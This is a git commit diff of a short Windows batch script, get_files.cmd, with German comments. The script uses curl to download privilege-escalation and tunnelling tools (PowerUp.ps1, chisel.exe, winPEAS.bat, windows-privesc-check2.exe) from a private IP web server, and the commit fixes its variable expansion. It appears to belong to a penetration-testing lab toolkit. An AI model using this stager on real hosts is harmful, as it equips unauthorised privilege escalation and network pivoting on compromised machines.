6d852c4b5e4f83d46d13e62a54f4a3628231f1ad
Core|Threat <30553333+ipcis@users.noreply.github.com>
2023-06-11 13:21:11 +0200

    Update get_files.cmd

--- get_files.cmd
+++ get_files.cmd
@@ -1,14 +1,14 @@
 @echo off
 
 :: Editiere die Ziel-IP-Adresse hier
-set target_ip=192.168.45.185:8000/download
-
-:: Basis-URL für den Dateidownload
-set "base_url=http://%target_ip%"
+setlocal enabledelayedexpansion
+set target_ip=192.168.1.122:8000/download/
 
 :: Schleife durch die Dateien und lade sie herunter
-for %%i in ("/PowerUp.ps1" "/chisel.exe" "/winPEAS.bat" "/windows-privesc-check2.exe") do (
-  set "url=%base_url%%%i"
-  echo Lade Datei herunter: %%i
-  curl -O "%url%" )
+for %%i in (PowerUp.ps1 chisel.exe winPEAS.bat windows-privesc-check2.exe) do (
+  set "url=!target_ip!%%i"
+  echo Lade Datei herunter: !url!
+  curl -O "!url!"
+)
 
+endlocal
